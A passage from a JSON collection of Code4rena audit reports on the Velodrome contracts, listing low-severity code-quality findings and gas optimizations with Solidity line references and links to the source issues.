IVotingEscrow(voting_escrow).deposit_for(_tokenId, amount); //@audit external function call\n289:             token_last_balance -= amount; //@audit low: CEIP not respected here\n290:         }\n291:         return amount;\n292:     }\n```\n\n## [L-02] Deprecated approve() function\n\nWhile `safeApprove()` in itself is deprecated, it is still better than `approve` which is subject to a known front-running attack and failing for certain token implementations that do not return a boolean value. Consider using `safeApprove` instead (or better: `safeIncreaseAllowance()`/`safeDecreaseAllowance()`):\n\n```solidity\ncontracts/contracts/Gauge.sol:\n  681:         token.call(abi.encodeWithSelector(IERC20.approve.selector, spender, value));\n\ncontracts/contracts/Minter.sol:\n   56:         _velo.approve(address(_ve), type(uint).max);\n  133:             _velo.approve(address(_voter), weekly);\n\ncontracts/contracts/RewardsDistributor.sol:\n  57:         IERC20(_token).approve(_voting_escrow, type(uint).max);\n\ncontracts/contracts/Voter.sol:\n  198:         IERC20(base).approve(_gauge, type(uint).max);\n```\n\n## [L-03] No account existence check for low-level call\n\nLow-level calls call/delegatecall/staticcall return true even if the account called is non-existent (per EVM design). Account existence must be checked prior to calling.\n\nConsider checking for account-existence before the `call()` to make this safely extendable to user-controlled address contexts in future (or, at least, prevent the `address(0)` entry):\n\n- contracts/contracts/Router.sol:\n\n```solidity\n230:         if (msg.value > amountETH) _safeTransferETH(msg.sender, msg.value - amountETH);\n...\n274:         _safeTransferETH(to, amountETH);\n...\n390:         _safeTransferETH(to, amounts[amounts.length - 1]);\n...\n404:     function _safeTransferETH(address to, uint value) internal {\n405:         (bool success,) = to.call{value:value}(new bytes(0)); //@audit : \"to\" can be address(0)\n406:         require(success, 'TransferHelper: ETH_TRANSFER_FAILED');\n407:     }\n```\n\n## [L-04] Add a timelock and event to critical functions\n\nIt is a good practice to give time for users to react and adjust to critical changes. A timelock provides more guarantees and reduces the level of trust required, thus decreasing risk for users. It also indicates that the project is legitimate (less risk of a malicious owner making a sandwich attack on a user).  \n\nConsider adding a timelock for `feeManager` and an event for `PairFactory.setFee()`:\n\n```solidity\nFile: PairFactory.sol\n65:     function setFee(bool _stable, uint256 _fee) external {\n66:         require(msg.sender == feeManager, 'not fee manager');\n67:         require(_fee <= MAX_FEE, 'fee too high');\n68:         require(_fee != 0, 'fee must be nonzero');\n69:         if (_stable) {\n70:             stableFee = _fee;\n71:         } else {\n72:             volatileFee = _fee;\n73:         }\n74:     }\n```\n\n## [L-05] `abi.encodePacked()` should not be used with dynamic types when passing the result to a hash function such as `keccak256()`\n\nUse `abi.encode()` instead which will pad items to 32 bytes, which will prevent hash collisions (e.g. `abi.encodePacked(0x123,0x456)` => `0x123456` => `abi.encodePacked(0x1,0x23456)`, but `abi.encode(0x123,0x456)` => `0x0...1230...456`). If there is only one argument to `abi.encodePacked()` it can often be cast to `bytes()` or `bytes32()` instead.\n\n- File: Pair.sol\n\n```solidity\n477:         bytes32 digest = keccak256(\n478:             abi.encodePacked(\n479:                 '\\x19\\x01',\n480:                 DOMAIN_SEPARATOR,\n481:                 keccak256(abi.encode(PERMIT_TYPEHASH, owner, spender, value, nonces[owner]++, deadline))\n482:             )\n483:         );\n```\n\n- File: Router.sol\n\n```solidity\n48:         pair = address(uint160(uint256(keccak256(abi.encodePacked(\n49:             hex'ff',\n50:             factory,\n51:             keccak256(abi.encodePacked(token0, token1, stable)),\n52:             pairCodeHash // init code hash\n53:         )))));\n```\n\n- File: VotingEscrow.sol\n\n```solidity\n1374:         bytes32 digest = keccak256(\n1375:             abi.encodePacked(\"\\x19\\x01\", domainSeparator, structHash)\n1376:         );\n```\n\n- File: PairFactory.sol\n\n```solidity\n93:         bytes32 salt = keccak256(abi.encodePacked(token0, token1, stable)); // notice salt includes stable as well, 3 parameters\n```\n\n## [N-01] Open TODOS\n\nConsider resolving the TODOs before deploying.\n\n```solidity\nMinter.sol:11:// TODO: decide on whether to abstract from VELO or not. currently it's only somewhat abstracted (e.g. L38)\nVelodromeLibrary.sol:9:    IRouter internal immutable router; // TODO make modifiable?\nVotingEscrow.sol:314:        // TODO delegates\nVotingEscrow.sol:465:        // TODO add delegates\nVotingEscrow.sol:524:        // TODO add delegates\n```\n\n## [N-02] Missing friendly revert strings\n\nFriendly messages should exist for users to understand what went wrong:\n\n```solidity\ncontracts/contracts/Bribe.sol:\n   24:       require(_unlocked == 1);\n   42:       require(amount > 0);\n   67:     require(msg.sender == gauge);\n   76:     require(msg.sender == gauge);\n   77:     require(rewards[i] == oldToken);\n   84:     require(msg.sender == gauge);\n   93:       require(token.code.length > 0);\n   96:       require(success && (data.length == 0 || abi.decode(data, (bool))));\n  100:       require(token.code.length > 0);\n  103:       require(success && (data.length == 0 || abi.decode(data, (bool))));\n\ncontracts/contracts/Gauge.sol:\n  125:         require(_unlocked == 1);\n  174:         require(msg.sender == voter);\n  189:         require(msg.sender == voter);\n  348:         require(msg.sender == account || msg.sender == voter);\n  512:         require(amount > 0);\n  521:             require(IVotingEscrow(_ve).ownerOf(tokenId) == msg.sender);\n  526:             require(tokenIds[msg.sender] == tokenId);\n  564:             require(tokenId == tokenIds[msg.sender]);\n  591:         require(token != stake);\n  592:         require(amount > 0);\n  609:             require(amount > _left);\n  613:         require(rewardRate[token] > 0);\n  628:         require(rewards[i] == oldToken);\n  640:         require(msg.sender == bribe);\n  654:             require(amount > _left);\n  665:         require(token.code.length > 0);\n  668:         require(success && (data.length == 0 || abi.decode(data, (bool))));\n  672:         require(token.code.length > 0);\n  675:         require(success && (data.length == 0 || abi.decode(data, (bool))));\n  679:         require(token.code.length > 0);\n  682:         require(success && (data.length == 0 || abi.decode(data, (bool))));\n\ncontracts/contracts/Minter.sol:\n   54:         require(initializer == msg.sender);\n  128:             require(_velo.transfer(team, _teamEmissions));\n  129:             require(_velo.transfer(address(_rewards_distributor), _growth));\n\ncontracts/contracts/Pair.sol:\n  111:         require(_unlocked == 1);\n  335:         require(!PairFactory(factory).isPaused());\n  522:         require(token.code.length > 0);\n  525:         require(success && (data.length == 0 || abi.decode(data, (bool))));\n\ncontracts/contracts/PairFees.sol:\n  20:         require(token.code.length > 0);\n  23:         require(success && (data.length == 0 || abi.decode(data, (bool))));\n  28:         require(msg.sender == pair);\n\ncontracts/contracts/RewardsDistributor.sol:\n   98:         assert(msg.sender == depositor);\n  319:         require(msg.sender == depositor);\n\ncontracts/contracts/Router.sol:\n   36:         assert(msg.sender == address(weth)); // only accept ETH via fallback from the WETH contract\n  164:         require(amountADesired >= amountAMin);\n  165:         require(amountBDesired >= amountBMin);\n  181:                 assert(amountAOptimal <= amountADesired);\n  227:         assert(weth.transfer(pair, amountETH));\n  245:         require(IPair(pair).transferFrom(msg.sender, pair, liquidity)); // send liquidity to pair\n  373:         assert(weth.transfer(pairFor(routes[0].from, routes[0].to, routes[0].stable), amounts[0]));\n  410:         require(token.code.length > 0);\n  413:         require(success && (data.length == 0 || abi.decode(data, (bool))));\n  417:         require(token.code.length > 0);\n  420:         require(success && (data.length == 0 || abi.decode(data, (bool))));\n\ncontracts/contracts/Velo.sol:\n  27:         require(msg.sender == minter);\n  32:         require(msg.sender == minter);\n  69:         require(msg.sender == minter);\n  75:         require(msg.sender == redemptionReceiver);\n\ncontracts/contracts/Voter.sol:\n   68:         require(_unlocked == 1);\n   75:         require(msg.sender == minter);\n   83:         require(msg.sender == governor);\n   88:         require(msg.sender == emergencyCouncil);\n   93:         require(IVotingEscrow(_ve).isApprovedOrOwner(msg.sender, _tokenId));\n  153:                 require(votes[_tokenId][_pool] == 0);\n  154:                 require(_poolWeight != 0);\n  173:         require(IVotingEscrow(_ve).isApprovedOrOwner(msg.sender, tokenId));\n  174:         require(_poolVote.length == _weights.length);\n  179:         require(msg.sender == governor);\n  184:         require(!isWhitelisted[_token]);\n  225:         require(isGauge[msg.sender]);\n  226:         require(isAlive[msg.sender]); // killed gauges cannot attach tokens to themselves\n  232:         require(isGauge[msg.sender]);\n  233:         require(isAlive[msg.sender]);\n  238:         require(isGauge[msg.sender]);\n  244:         require(isGauge[msg.sender]);\n  286:         require(isAlive[_gauge]); // killed gauges cannot be updated\n  316:         require(isAlive[_gauge]); // killed gauges cannot distribute\n  352:         require(token.code.length > 0);\n  355:         require(success && (data.length == 0 || abi.decode(data, (bool))));\n\ncontracts/contracts/VotingEscrow.sol:\n   112:         require(_entered_state == _not_entered);\n   242:         require(owner != address(0));\n   244:         require(_approved != owner);\n   248:         require(senderIsOwner || senderIsApprovedForAll);\n   262:         assert(_operator != msg.sender);\n   272:         assert(idToOwner[_tokenId] == _owner);\n   309:         require(_isApprovedOrOwner(_sender, _tokenId));\n   447:         assert(idToOwner[_tokenId] == address(0));\n   464:         assert(_to != address(0));\n   508:         assert(idToOwner[_tokenId] == _from);\n   748:             assert(IERC20(token).transferFrom(from, address(this), _value));\n   772:         require(_value > 0); // dev: need non-zero value\n   785:         require(_value > 0); // dev: need non-zero value\n   815:         assert(_isApprovedOrOwner(msg.sender, _tokenId));\n   819:         assert(_value > 0); // dev: need non-zero value\n   829:         assert(_isApprovedOrOwner(msg.sender, _tokenId));\n   845:         assert(_isApprovedOrOwner(msg.sender, _tokenId));\n   861:         assert(IERC20(token).transfer(msg.sender, value));\n   937:         assert(_block <= block.number);\n   991:         assert(_block <= block.number);\n  1060:         require(msg.sender == voter);\n  1065:         require(msg.sender == voter);\n  1070:         require(msg.sender == voter);\n  1075:         require(msg.sender == voter);\n  1080:         require(msg.sender == voter);\n  1086:         require(_from != _to);\n  1087:         require(_isApprovedOrOwner(msg.sender, _from));\n  1088:         require(_isApprovedOrOwner(msg.sender, _to));\n\ncontracts/contracts/factories/GaugeFactory.sol:\n  18:         require(msg.sender == team);\n\ncontracts/contracts/factories/PairFactory.sol:\n  41:         require(msg.sender == pauser);\n  46:         require(msg.sender == pendingPauser);\n  51:         require(msg.sender == pauser);\n```\n\n## [N-03] `require()` should be used for checking error conditions on inputs and return values while `assert()` should be used for invariant checking\n\nProperly functioning code should **never** reach a failing assert statement, unless there is a bug in your contract you should fix. Here, I believe the assert should be a require or a revert:\n\n```solidity\nRewardsDistributor.sol:98:        assert(msg.sender == depositor);\nRouter.sol:36:        assert(msg.sender == address(weth)); // only accept ETH via fallback from the WETH contract\nRouter.sol:181:                assert(amountAOptimal <= amountADesired);\nRouter.sol:227:        assert(weth.transfer(pair, amountETH));\nRouter.sol:373:        assert(weth.transfer(pairFor(routes[0].from, routes[0].to, routes[0].stable), amounts[0]));\nVotingEscrow.sol:262:        assert(_operator != msg.sender);\nVotingEscrow.sol:272:        assert(idToOwner[_tokenId] == _owner);\nVotingEscrow.sol:447:        assert(idToOwner[_tokenId] == address(0));\nVotingEscrow.sol:464:        assert(_to != address(0));\nVotingEscrow.sol:508:        assert(idToOwner[_tokenId] == _from);\nVotingEscrow.sol:748:            assert(IERC20(token).transferFrom(from, address(this), _value));\nVotingEscrow.sol:815:        assert(_isApprovedOrOwner(msg.sender, _tokenId));\nVotingEscrow.sol:819:        assert(_value > 0); // dev: need non-zero value\nVotingEscrow.sol:829:        assert(_isApprovedOrOwner(msg.sender, _tokenId));\nVotingEscrow.sol:845:        assert(_isApprovedOrOwner(msg.sender, _tokenId));\nVotingEscrow.sol:861:        assert(IERC20(token).transfer(msg.sender, value));\nVotingEscrow.sol:937:        assert(_block <= block.number);\nVotingEscrow.sol:991:        assert(_block <= block.number);\n```\n\nAs the Solidity version is > 0.8.* the remaining gas would still be refunded in case of failure.\n",
    "dataSource": {
      "name": "code-423n4/2022-05-velodrome-findings",
      "repo": "https://github.com/code-423n4/2022-05-velodrome-findings",
      "url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/207"
    }
  },
  {
    "title": "QA Report",
    "body": "* There are some unsafe casts, meaning if the value is greater, it will be truncated, e.g.:\n```solidity\n  _locked.amount += int128(int256(_value));\n```\nBetter utilize SafeCast library where possible.\n\n* The current best practice is to use safe ERC20 library for token interactions (safeApprove and safeTransfer). \nThere are some instances in code where regular transfers are used, e.g.:\n```solidity\n   assert(IERC20(token).transfer(msg.sender, value));\n   assert(IERC20(token).transferFrom(from, address(this), _value));\n```\n\n* setGovernor and setEmergencyCouncil could be a 2-step (propose-accept) process to reduce the possibility of an error.\n\n*  When an old reward token is replaced by swapOutRewardToken, the old token balance will be left in the contract. Consider extracting this balance before updating the tokens. Or even better, add token sweep functions for unprotected tokens.\n\n* Consider keeping the rewards list in Gauge and Bribe in sync.",
    "dataSource": {
      "name": "code-423n4/2022-05-velodrome-findings",
      "repo": "https://github.com/code-423n4/2022-05-velodrome-findings",
      "url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/202"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "# Gas Optimizations Report\n\n## For-Loops: Cache array length outside of loops\nReading an array length at each iteration of the loop takes 6 gas (3 for `mload` and 3 to place `memory_offset`) in the stack.\n\nCaching the array length in the stack saves around 3 gas per iteration. \n\nFor example:\n```js\nfor (uint256 i; i < arr.length; ++i) {}\n```\ncan be changed to:\n```js\nuint256 len = arr.length;\nfor (uint256 i; i < len; ++i) {}\n```\n\nConsider making the following change to these lines:  \n```js\ncontracts/Pair.sol:\n 257:        for (uint i = 0; i < _prices.length; i++) {\n\ncontracts/Gauge.sol:\n 353:        for (uint i = 0; i < tokens.length; i++) {\n\ncontracts/RewardsDistributor.sol:\n 301:        for (uint i = 0; i < _tokenIds.length; i++) {\n\ncontracts/Minter.sol:\n  57:        for (uint i = 0; i < claimants.length; i++) {\n\ncontracts/Voter.sol:\n  76:        for (uint i = 0; i < _tokens.length; i++) {\n 266:        for (uint i = 0; i < _gauges.length; i++) {\n 304:        for (uint i = 0; i < _gauges.length; i++) {\n 310:        for (uint i = 0; i < _gauges.length; i++) {\n 346:        for (uint x = 0; x < _gauges.length; x++) {\n\ncontracts/VotingEscrow.sol:\n1146:        for (uint i = 0; i < _tokenIds.length; i++) {\n1193:        for (uint i = 0; i < _tokenIds.length; i++) {\n1225:        for (uint i = 0; i < srcRepOld.length; i++) {\n1249:        for (uint i = 0; i < dstRepOld.length; i++) {\n1295:        for (uint i = 0; i < srcRepOld.length; i++) {\n1320:        for (uint i = 0; i < dstRepOld.length; i++) {\n\ncontracts/Router.sol:\n  90:        for (uint i = 0; i < routes.length; i++) {\n 316:        for (uint i = 0; i < routes.length; i++) {\n```\n\n## For-Loops: Index increments can be left unchecked\nFrom Solidity v0.8 onwards, all arithmetic operations come with implicit overflow and underflow checks. \n\nIn for-loops, as it is impossible for the index to overflow, it can be left unchecked to save gas every iteration. \n\nFor example, the code below:\n```js\nfor (uint256 i; i < numIterations; ++i) {  \n    // ...  \n}  \n```\ncan be changed to:\n```js\nfor (uint256 i; i < numIterations;) {  \n    // ...  \n    unchecked { ++i; }  \n}  \n```\n\nConsider making the following change to these lines:  \n```js\ncontracts/VelodromeLibrary.sol:\n  24:        for (uint i = 0; i < 255; i++) {\n\ncontracts/Pair.sol:\n 257:        for (uint i = 0; i < _prices.length; i++) {\n 276:        for (; i < length; i+=window) {\n 389:        for (uint i = 0; i < 255; i++) {\n\ncontracts/Gauge.sol:\n 179:        for (uint i = 0; i < numRewards; i++) {\n 353:        for (uint i = 0; i < tokens.length; i++) {\n 405:        for (uint i = _startIndex; i < _endIndex; i++) {\n 426:        for (uint i; i < length; i++) {\n 448:        for (uint i = _startIndex; i < _endIndex; i++) {\n 484:        for (uint i = _startIndex; i < _endIndex; i++) {\n\ncontracts/RewardsDistributor.sol:\n  75:        for (uint i = 0; i < 20; i++) {\n 105:        for (uint i = 0; i < 128; i++) {\n 121:        for (uint i = 0; i < 128; i++) {\n 148:        for (uint i = 0; i < 20; i++) {\n 195:        for (uint i = 0; i < 50; i++) {\n 252:        for (uint i = 0; i < 50; i++) {\n 301:        for (uint i = 0; i < _tokenIds.length; i++) {\n\ncontracts/Minter.sol:\n  57:        for (uint i = 0; i < claimants.length; i++) {\n\ncontracts/Voter.sol:\n  76:        for (uint i = 0; i < _tokens.length; i++) {\n 103:        for (uint i = 0; i < _poolVoteCnt; i ++) {\n 128:        for (uint i = 0; i < _poolCnt; i ++) {\n 143:        for (uint i = 0; i < _poolCnt; i++) {\n 147:        for (uint i = 0; i < _poolCnt; i++) {\n 266:        for (uint i = 0; i < _gauges.length; i++) {\n 272:        for (uint i = start; i < end; i++) {\n 304:        for (uint i = 0; i < _gauges.length; i++) {\n 310:        for (uint i = 0; i < _gauges.length; i++) {\n 340:        for (uint x = start; x < finish; x++) {\n 346:        for (uint x = 0; x < _gauges.length; x++) {\n\ncontracts/VotingEscrow.sol:\n 632:        for (uint i = 0; i < 255; ++i) {\n 886:        for (uint i = 0; i < 128; ++i) {\n 942:        for (uint i = 0; i < 128; ++i) {\n1017:        for (uint i = 0; i < 255; ++i) {\n1146:        for (uint i = 0; i < _tokenIds.length; i++) {\n1193:        for (uint i = 0; i < _tokenIds.length; i++) {\n1225:        for (uint i = 0; i < srcRepOld.length; i++) {\n1249:        for (uint i = 0; i < dstRepOld.length; i++) {\n1295:        for (uint i = 0; i < srcRepOld.length; i++) {\n1320:        for (uint i = 0; i < dstRepOld.length; i++) {\n1325:        for (uint i = 0; i < ownerTokenCount; i++) {\n\ncontracts/Router.sol:\n  90:        for (uint i = 0; i < routes.length; i++) {\n 316:        for (uint i = 0; i < routes.length; i++) {\n```\n\n## Arithmetics: `++i` costs less gas compared to `i++` or `i += 1`\n`++i` costs less gas compared to `i++` or `i += 1` for unsigned integers, as pre-increment is cheaper (about 5 gas per iteration). This statement is true even with the optimizer enabled.\n\n`i++` increments `i` and returns the initial value of `i`. Which means:\n```js\nuint i = 1;  \ni++; // == 1 but i == 2  \n```\nBut `++i` returns the actual incremented value:\n```js\nuint i = 1;  \n++i; // == 2 and i == 2 too, so no need for a temporary variable  \n```\n\nIn the first case, the compiler has to create a temporary variable (when used) for returning `1` instead of `2`, thus it costs more gas.\n\nThe same logic applies for `--i` and `i--`.\n\nConsider using `++i` instead of `i++` or `i += 1` in the following instances:  \n```js\ncontracts/VelodromeLibrary.sol:\n  24:        for (uint i = 0; i < 255; i++) {\n\ncontracts/Pair.sol:\n 257:        for (uint i = 0; i < _prices.length; i++) {\n 282:        index = index + 1;\n 389:        for (uint i = 0; i < 255; i++) {\n\ncontracts/Gauge.sol:\n 179:        for (uint i = 0; i < numRewards; i++) {\n 353:        for (uint i = 0; i < tokens.length; i++) {\n 405:        for (uint i = _startIndex; i < _endIndex; i++) {\n 426:        for (uint i; i < length; i++) {\n 448:        for (uint i = _startIndex; i < _endIndex; i++) {\n 484:        for (uint i = _startIndex; i < _endIndex; i++) {\n\ncontracts/RewardsDistributor.sol:\n  75:        for (uint i = 0; i < 20; i++) {\n 105:        for (uint i = 0; i < 128; i++) {\n 121:        for (uint i = 0; i < 128; i++) {\n 148:        for (uint i = 0; i < 20; i++) {\n 195:        for (uint i = 0; i < 50; i++) {\n 199:        user_epoch += 1;\n 252:        for (uint i = 0; i < 50; i++) {\n 256:        user_epoch += 1;\n 301:        for (uint i = 0; i < _tokenIds.length; i++) {\n\ncontracts/Minter.sol:\n  57:        for (uint i = 0; i < claimants.length; i++) {\n\ncontracts/Voter.sol:\n  76:        for (uint i = 0; i < _tokens.length; i++) {\n 143:        for (uint i = 0; i < _poolCnt; i++) {\n 147:        for (uint i = 0; i < _poolCnt; i++) {\n 266:        for (uint i = 0; i < _gauges.length; i++) {\n 272:        for (uint i = start; i < end; i++) {\n 304:        for (uint i = 0; i < _gauges.length; i++) {\n 310:        for (uint i = 0; i < _gauges.length; i++) {\n 340:        for (uint x = start; x < finish; x++) {\n 346:        for (uint x = 0; x < _gauges.length; x++) {\n\ncontracts/VotingEscrow.sol:\n 137:        digits++;\n 142:        digits -= 1;\n 453:        ownerToNFTokenCount[_to] += 1;\n 655:        _epoch += 1;\n1076:        attachments[_tokenId] = attachments[_tokenId] + 1;\n1081:        attachments[_tokenId] = attachments[_tokenId] - 1;\n1146:        for (uint i = 0; i < _tokenIds.length; i++) {\n1193:        for (uint i = 0; i < _tokenIds.length; i++) {\n1225:        for (uint i = 0; i < srcRepOld.length; i++) {\n1249:        for (uint i = 0; i < dstRepOld.length; i++) {\n1295:        for (uint i = 0; i < srcRepOld.length; i++) {\n1320:        for (uint i = 0; i < dstRepOld.length; i++) {\n1325:        for (uint i = 0; i < ownerTokenCount; i++) {\n\ncontracts/Router.sol:\n  90:        for (uint i = 0; i < routes.length; i++) {\n 316:        for (uint i = 0; i < routes.length; i++) {\n```\n\n## Arithmetics: Use `!= 0` instead of `> 0` for unsigned integers\n`uint` will never go below 0. Thus, `> 0` is gas inefficient in comparisons as checking if `!= 0` is sufficient and costs less gas.\n\nConsider changing `> 0` to `!= 0` in these lines:  \n```js\ncontracts/Pair.sol:\n 140:        if (claimed0 > 0 || claimed1 > 0) {\n 154:        if (_ratio > 0) {\n 164:        if (_ratio > 0) {\n 174:        if (_supplied > 0) {\n 183:        if (_delta0 > 0) {\n 187:        if (_delta1 > 0) {\n 207:        if (timeElapsed > 0 && _reserve0 != 0 && _reserve1 != 0) {\n 303:        require(liquidity > 0, 'ILM'); // Pair: INSUFFICIENT_LIQUIDITY_MINTED\n 322:        require(amount0 > 0 && amount1 > 0, 'ILB'); // Pair: INSUFFICIENT_LIQUIDITY_BURNED\n 336:        require(amount0Out > 0 || amount1Out > 0, 'IOA'); // Pair: INSUFFICIENT_OUTPUT_AMOUNT\n 345:        if (amount0Out > 0) _safeTransfer(_token0, to, amount0Out); // optimistically transfer tokens\n 346:        if (amount1Out > 0) _safeTransfer(_token1, to, amount1Out); // optimistically transfer tokens\n 347:        if (data.length > 0) IPairCallee(to).hook(msg.sender, amount0Out, amount1Out, data); // callback, used for flash loans\n 353:        require(amount0In > 0 || amount1In > 0, 'IIA'); // Pair: INSUFFICIENT_INPUT_AMOUNT\n 356:        if (amount0In > 0) _update0(amount0In * PairFactory(factory).getFee(stable) / 10000); // accrue fees for token0 and move them out of pool\n 357:        if (amount1In > 0) _update1(amount1In * PairFactory(factory).getFee(stable) / 10000); // accrue fees for token1 and move them out of pool\n 522:        require(token.code.length > 0);\n\ncontracts/Gauge.sol:\n 140:        if (claimed0 > 0 || claimed1 > 0) {\n 144:        if (_fees0 / DURATION > 0) {\n 151:        if (_fees1 / DURATION > 0) {\n 182:        if (epochRewards > 0) {\n 306:        if (_nCheckPoints > 0 && checkpoints[account][_nCheckPoints - 1].timestamp == _timestamp) {\n 309:        bool prevVoteStatus = (_nCheckPoints > 0) ? checkpoints[account][_nCheckPoints].voted : false;\n 318:        if (_nCheckPoints > 0 && rewardPerTokenCheckpoints[token][_nCheckPoints - 1].timestamp == timestamp) {\n 330:        if (_nCheckPoints > 0 && supplyCheckpoints[_nCheckPoints - 1].timestamp == _timestamp) {\n 359:        if (_reward > 0) _safeTransfer(tokens[i], account, _reward);\n 407:        if (sp0.supply > 0) {\n 447:        if (_endIndex > 0) {\n 450:        if (sp0.supply > 0) {\n 461:        if (sp.supply > 0) {\n 483:        if (_endIndex > 0) {\n 512:        require(amount > 0);\n 520:        if (tokenId > 0) {\n 563:        if (tokenId > 0) {\n 592:        require(amount > 0);\n 613:        require(rewardRate[token] > 0);\n 665:        require(token.code.length > 0);\n 672:        require(token.code.length > 0);\n 679:        require(token.code.length > 0);\n\ncontracts/Bribe.sol:\n  42:        require(amount > 0);\n  86:        if (rewardPerEpoch > 0) {\n  93:        require(token.code.length > 0);\n 100:        require(token.code.length > 0);\n\ncontracts/Voter.sol:\n 111:        if (_votes > 0) {\n 167:        if (_usedWeight > 0) IVotingEscrow(_ve).voting(_tokenId);\n 227:        if (tokenId > 0) IVotingEscrow(_ve).attach(tokenId);\n 239:        if (tokenId > 0) IVotingEscrow(_ve).detach(tokenId);\n 259:        if (_ratio > 0) {\n 289:        if (_supplied > 0) {\n 294:        if (_delta > 0) {\n 322:        if (_claimable > IGauge(_gauge).left(base) && _claimable / DURATION > 0) {\n 352:        require(token.code.length > 0);\n\ncontracts/VotingEscrow.sol:\n 369:        return size > 0;\n 614:        if (_epoch > 0) {\n 772:        require(_value > 0); // dev: need non-zero value\n 785:        require(_value > 0); // dev: need non-zero value\n 819:        assert(_value > 0); // dev: need non-zero value\n1214:        if (srcRep != dstRep && _tokenId > 0) {\n1217:        uint[] storage srcRepOld = srcRepNum > 0\n1237:        uint[] storage dstRepOld = dstRepNum > 0\n1269:        _nCheckPoints > 0 &&\n1287:        uint[] storage srcRepOld = srcRepNum > 0\n1307:        uint[] storage dstRepOld = dstRepNum > 0\n\ncontracts/PairFees.sol:\n  20:        require(token.code.length > 0);\n  29:        if (amount0 > 0) _safeTransfer(token0, recipient, amount0);\n  30:        if (amount1 > 0) _safeTransfer(token1, recipient, amount1);\n\ncontracts/Router.sol:\n  58:        require(amountA > 0, 'Router: INSUFFICIENT_AMOUNT');\n  59:        require(reserveA > 0 && reserveB > 0, 'Router: INSUFFICIENT_LIQUIDITY');\n 410:        require(token.code.length > 0);\n 417:        require(token.code.length > 0);\n```\n\n## Arithmetics: Unchecking arithmetic operations that cannot underflow/overflow\nFrom Solidity v0.8 onwards, all arithmetic operations come with implicit overflow and underflow checks. In some instances, an overflow/underflow is impossible, such as:\n* A check is in place before the arithmetic operation\n* The value realistically cannot overflow, such as amount of ETH sent\n\nAs such, gas can be saved by using an [unchecked block](https://docs.soliditylang.org/en/v0.8.10/control-structures.html#checked-or-unchecked-arithmetic) to remove the implicit checks:\n```js\n  unchecked { a += b; }\n```\n\nBelow are instances that can be left `unchecked`:\n```js\ncontracts/Velo.sol:\n  43:        balanceOf[_to] += _amount\n  44:        totalSupply += _amount;  \n  51:        balanceOf[_to] += _value;\n\ncontracts/VotingEscrow.sol:\n 137:        digits++;\n 142:        digits -= 1;\n 453:        ownerToNFTokenCount[_to] += 1;\n 514:        ownerToNFTokenCount[_from] -= 1;\n 734:        _locked.amount += int128(int256(_value));\n 789:        ++tokenId;\n1076:        attachments[_tokenId] = attachments[_tokenId] + 1;\n1081:        attachments[_tokenId] = attachments[_tokenId] - 1;\n1148:        votes = votes + _balanceOfNFT(tId, block.timestamp);\n1196:        votes = votes + _balanceOfNFT(tId, timestamp);\n1232:        numCheckpoints[srcRep] = srcRepNum + 1;\n1255:        numCheckpoints[dstRep] = dstRepNum + 1;\n1272:        return _nCheckPoints - 1;\n1302:        numCheckpoints[srcRep] = srcRepNum + 1;\n1330:        numCheckpoints[dstRep] = dstRepNum + 1;\n\ncontracts/Pair.sol:\n 155:        index0 += _ratio;\n 165:        index1 += _ratio;\n 185:        claimable0[recipient] += _share;\n 189:        claimable1[recipient] += _share;\n 258:        priceAverageCumulative += _prices[i];\n 277:        nextIndex = i + window;\n 282:        index = index + 1;\n 447:        totalSupply += amount;\n 448:        balanceOf[dst] += amount;\n 516:        balanceOf[dst] += amount;\n\ncontracts/RewardsDistributor.sol:\n 160:        t += WEEK;\n 199:        user_epoch += 1;\n 213:        week_cursor += WEEK;\n 256:        user_epoch += 1;\n 270:        week_cursor += WEEK;\n 307:        total += amount;\n\ncontracts/Gauge.sol:\n 141:        uint _fees0 = fees0 + claimed0;\n 142:        uint _fees1 = fees1 + claimed1\n 214:        return (nCheckpoints - 1);\n 223:        uint upper = nCheckpoints - 1;\n 246:        return (nCheckpoints - 1);\n 255:        uint upper = nCheckpoints - 1;\n 287:        uint upper = nCheckpoints - 1;\n 311:        numCheckpoints[account] = _nCheckPoints + 1;\n 322:        rewardPerTokenNumCheckpoints[token] = _nCheckPoints + 1;\n 334:        supplyNumCheckpoints = _nCheckPoints + 1;\n 368:        derivedSupply += _derivedBalance;\n 410:        reward += _reward;\n 445:        uint _endIndex = supplyNumCheckpoints-1;\n 453:        reward += _reward;\n 463:        reward += _reward;\n 517:        totalSupply += amount;\n 518:        balanceOf[msg.sender] += amount;\n 535:        derivedSupply += _derivedBalance;\n 575:        derivedSupply += _derivedBalance;\n 586:        uint _remaining = periodFinish[token] - block.timestamp;\n 607:        uint _remaining = periodFinish[token] - block.timestamp;\n 652:        uint _remaining = periodFinish[token] - block.timestamp;\n 659:        periodFinish[token] = epochStart + DURATION;\n\ncontracts/Bribe.sol:\n  37:        uint bribeEnd = bribeStart + DURATION - COOLDOWN;\n\ncontracts/Voter.sol:\n 112:        _totalWeight += _votes;\n 144:        _totalVoteWeight += _weights[i];\n 159:        weights[_pool] += _poolWeight;\n 160:        votes[_tokenId][_pool] += _poolWeight;\n 161:        _usedWeight += _poolWeight;\n 162:        _totalWeight += _poolWeight;\n 168:        totalWeight += uint256(_totalWeight);\n 260:        index += _ratio;\n 269:        claimable[_gauge] += _share;\n```\n\n## Visibility: Consider declaring constants as non-public to save gas\nIf a constant is not used outside of its contract, declaring it as `private` or `internal` instead of `public` can save gas.\n\nConsider changing the visibility of the following from `public` to `internal` or `private`:  \n```js\ncontracts/Minter.sol:\n  30:        uint public constant MAX_TEAM_RATE = 50;\n\ncontracts/VeloGovernor.sol:\n  19:        uint256 public constant MAX_PROPOSAL_NUMERATOR = 50;\n  20:        uint256 public constant PROPOSAL_DENOMINATOR = 1000;\n\ncontracts/VotingEscrow.sol:\n1106:        bytes32 public constant DOMAIN_TYPEHASH = keccak256(\"EIP712Domain(string name,uint256 chainId,address verifyingContract)\");\n1109:        bytes32 public constant DELEGATION_TYPEHASH = keccak256(\"Delegation(address delegatee,uint256 nonce,uint256 expiry)\");\n1113:        uint public constant MAX_DELEGATES = 1024;\n\ncontracts/factories/PairFactory.sol:\n  14:        uint256 public constant MAX_FEE = 5;\n```\n\n## Visibility: `public` functions can be set to `external`\nCalls to `external` functions are cheaper than `public` functions. Thus, if a function is not used internally in any contract, it should be set to `external` to save gas and improve code readability.\n\nConsider changing following functions from `public` to `external`:  \n```js\ncontracts/Gauge.sol:\n 163:        function getVotingStage(uint timestamp) public pure returns (VotingStage) 